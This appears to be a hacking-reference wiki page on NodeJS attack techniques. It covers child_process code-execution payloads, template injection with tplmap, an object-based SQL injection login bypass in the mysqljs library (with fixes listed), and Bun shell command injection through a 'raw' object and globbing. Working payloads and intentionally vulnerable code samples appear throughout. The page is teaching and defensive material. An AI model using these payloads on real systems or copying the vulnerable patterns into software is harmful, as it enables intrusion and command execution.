---
description: The backend for running JavaScript as a server or application
---

# NodeJS

## # Related Pages

{% content-ref url="../javascript/" %}
[javascript](../javascript/)
{% endcontent-ref %}

## Code Execution

<pre class="language-javascript"><code class="lang-javascript">// Simplest
<strong>require("child_process").execSync("id").toString()
</strong>// When require() is undefined
<strong>process.mainModule.require("child_process").execSync("id").toString()
</strong>// When process.mainModule is undefined
<strong>process.binding('spawn_sync').spawn({
</strong><strong>    file: '/bin/sh',
</strong><strong>    args: ['sh', '-c', 'id'],
</strong><strong>    stdio: [
</strong><strong>        {type:'pipe',readable:1,writable:0},
</strong><strong>        {type:'pipe',readable:0,writable:1},
</strong><strong>        {type:'pipe',readable:0,writable:1}
</strong><strong>    ]
</strong><strong>}).output.toString()
</strong></code></pre>

## Template Injection (SSTI)

Similar to [sqlmap](https://github.com/sqlmapproject/sqlmap), there is [tplmap](https://github.com/epinna/tplmap) which aims to automate template injections by testing various templating engines, as many exist for NodeJS. Here is a simple example:

```shell-session
$ python2 tplmap.py -u http://localhost:3000/?name=john
```

The tool also allows you to exploit the injection using arguments such as `--os-shell`. \
See the `--help` page for more useful arguments.&#x20;

## Dependencies (`package.json`)

In every NodeJS project, there is a `package.json` file which contains a lot of metadata information about the project, such as where the main file is, some description, and the dependencies. These are external pieces of code with a version number attached that are used throughout the project.&#x20;

A possible problem is when these dependencies aren't regularly updated, and vulnerabilities might be found in those dependencies and be fixed in later versions. If the code keeps using the older version it may become vulnerable because of those dependencies.&#x20;

A simple way to check for known vulnerabilities is by uploading the `package.json` file to Snyk checker:

{% embed url="https://snyk.io/advisor/check/npm" %}
Upload your package.json file and see all the vulnerabilities in old dependencies
{% endembed %}

For attackers, this can give an idea of what vulnerabilities there might be. Of course, not all vulnerabilities this checker finds are actually exploitable, but you should find what parts/functions of the vulnerable code are used to see if it is.&#x20;

### [`mysqljs/mysql`](https://www.npmjs.com/package/mysql) library (latest) - SQL Injection using Objects

{% embed url="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4" %}
Source of this trick, using JSON Objects to inject into prepared statements
{% endembed %}

This popular `npm` library uses prepared statements to prevent SQL Injection using regular _strings_, but a code example like the following is surprisingly still **vulnerable**:

<pre class="language-javascript"><code class="lang-javascript">...
app.post("/auth", function (request, response) {
 var username = request.body.username;
 var password = request.body.password;
 if (username &#x26;&#x26; password) {
<strong>  connection.query(
</strong><strong>   "SELECT * FROM users WHERE username = ? AND password = ?",
</strong><strong>   [username, password],
</strong>   function (error, results, fields) {
    ...
   }
  );
 }
});
...
</code></pre>

In this case the `username` and `password` variables are directly passed into the SQL query, but using prepared statements with `?` question marks as placeholders. Normally this would not be vulnerable to SQL Injection as the library handles separating code and data for you, which would be true if the variables were strings. \
If the variables are _objects,_ however, weird things start to happen. With web endpoints in Express like the above, you can use the `Content-Type: application/json` to use JSON for your body, which may contain a more complex `Object` like the following:

```json
{
  "username": "admin",
  "password": {
    "password": 1
  }
}
```

This is not a string anymore and `mysql` will have to put it into the query somehow. Instead of simply stringifying the object, it does something unexpected where key-value pairs become `key=value` pairs inside of the final query:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = password = 1
```

To understand what this weird new query does, we follow the code from **left to right**. The `WHERE` clause makes sure `username` is equal to `'admin'`, and then comes the messed-up syntax. What actually happens here is that the first part `password = password` means "the password column equals the password _column_", which is always true! Then the last `= 1` simply tests if the previous expression is equal to one. Due to type coercion, `TRUE` is the same as `1`, so this condition will also be true.&#x20;

This results in only the username being checked, which in theory could also be injected in the same way by providing an object for the username, if the administrator username is not known and we want to simply log in as the _first_ user.&#x20;

{% hint style="info" %}
**Tip**: JSON is not the only way to create an `Object` instead of a `String`, as some frameworks also accept the `?name[key]=value` syntax in query or body parameters. The above login bypass would look like this with the new syntax:

<pre class="language-javascript"><code class="lang-javascript">Content-Type: application/x-www-form-urlencoded
...

<strong>username=admin&#x26;password[password]=1
</strong></code></pre>
{% endhint %}

{% hint style="success" %}
Successful **protections** against this technique are:

* The alternative [`mysql2`](https://www.npmjs.com/package/mysql2) library
* Wrapping parameters in `String(...)` to stringify them
* The `stringifyObjects: true` option while setting up with `createConnection`:

<pre class="language-javascript"><code class="lang-javascript">connection = mysql.createConnection({
  ...
<strong>  stringifyObjects: true,
</strong>})
</code></pre>
{% endhint %}

### Bun $ Shell - Command Injection using Objects

Bun is an alternative JavaScript runtime just like NodeJS, but has some more native packages. One such API is the [$ Shell API](https://bun.sh/docs/runtime/shell) that allows running shell commands safely with [Tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template\_literals#tagged\_templates). User input as a string will be **escaped** properly to prevent injection of more commands.&#x20;

Take a look at the following example:

<pre class="language-typescript" data-title="Example"><code class="lang-typescript">import express from "express";
import { $ } from "bun";

app.get("/", async (req, res) => {
<strong>  const dir = req.query.dir || "";
</strong>
  res.set("Content-Type", "text/plain");
  try {
<strong>    const output = await $`ls /${dir}`.text();
</strong>
    res.send(output);
  } catch (err) {
    console.error(err);
    res.status(500).send(`${err.message}\n${err.stderr}`);
  }
});
</code></pre>

Running this, we can try to access `/?dir=$(id)` in hopes of command substitution, but we get an error instead:

> ```
> ls: /$(id): No such file or directory
> ```

The same will happen for any command injection attempt. There are however, edge cases where this is exploitable, and the example above is surprisingly one of them. The problem lies in an obscure functionality that disables the escaping of arguments: [**`$.escape` (escape strings)**](https://bun.sh/docs/runtime/shell#escape-escape-strings)

In that section of the documentation an interesting example is shown:

> If you do not want your string to be escaped, wrap it in a `{ raw: 'str' }` object:

```javascript
import { $ } from "bun";

await $`echo ${{ raw: '$(foo) `bar` "baz"' }}`;
// => bun: command not found: foo
// => bun: command not found: bar
// => baz
```

If the value in the tagged template is an **object with a `raw` key**, the value **is not escaped**. If we are able to abuse any functionality to make our input into an object, we can include this `raw:` key ourselves to bypass the filtering. In Express, this is possible by using a more complex query string that can create objects like `?dir[raw]=$(id)` becoming `{ raw: "$(id)" }`. This works!

> ```
> Failed with exit code 1
> ls: groups=1000(user): No such file or directory
> ls: /uid=1000(user): No such file or directory
> ls: gid=1000(user): No such file or directory
> ```

Many other frameworks allow creating an object like this from a query string, or even directly from **JSON input** in a request body.&#x20;

#### Globbing

One more interesting functionality in Bun is that [globbing](https://tldp.org/LDP/abs/html/globbingref.html) is partially implemented for filename expansion. This allows inputs like `*` to match all files, and more specific patterns like `*.txt` to match only files ending in `.txt`. Take the following example:

```javascript
const string = String(req.query.string || "");
const output = await $`echo ${string}`.text();
```

The above code should directly echo back your input, but natively it allows wildcards to match any local filenames, even in different directories:

{% code title="?string=*" %}
```bash
package.json node_modules tsconfig.json bun.lockb README.md index.ts
```
{% endcode %}

{% code title="?string=../*" %}
```bash
../project1 ../project2 ../project3
```
{% endcode %}

{% code title="?string=/etc/*" %}
```bash
/etc/alternatives /etc/apt /etc/bash.bashrc ...
```
{% endcode %}

Note that depending on the filenames matched, this can even inject multiple arguments into a place where normally only one argument should be. The following Python script can be used to test this:

{% code title="args.py" %}
```python
#!/usr/bin/env python3
import sys
print(sys.argv[1:])
```
{% endcode %}

```javascript
const string = String(req.query.string || "");
const output = await $`./args.py ${string}`.text();
```

The above will generate multiple arguments in the place of `${string}`, and if you have control over the filenames matched, it may allow you to perform some more complex [#argument-injection-wildcards](../../linux/linux-privilege-escalation/command-exploitation.md#argument-injection-wildcards "mention") attacks:

{% code title="?string=a%20b%20c" %}
```python
# Notice a single argument normally:
['1 2 3']
```
{% endcode %}

{% code title="?string=*" %}
```python
# Notice multiple arguments using wildcard:
['package.json', 'args.py', 'node_modules', 'tsconfig.json', 'bun.lockb', 'README.md', 'index.ts']
```
{% endcode %}
